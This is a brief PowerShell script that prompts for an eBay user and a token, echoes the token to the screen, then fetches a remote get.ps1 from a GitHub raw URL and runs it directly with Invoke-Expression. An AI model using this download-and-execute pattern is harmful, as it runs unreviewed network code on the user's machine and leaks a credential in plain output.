
New-Item -Path .\ -Name solicitar_variable.ps1 -ItemType File

$userebay = Read-Host "Introduce eBay user"
$userebay = $userebay.ToString()

$variable = Read-Host "Introduce the token"

$variable = $variable.ToString()

Write-Host "El token es: $variable"

$curl = curl.exe -H "Authorization: token $variable" https://raw.githubusercontent.com/jdiaest1/office2/main/get.ps1 --raw

$prueba = [string]$curl

Invoke-Expression $prueba
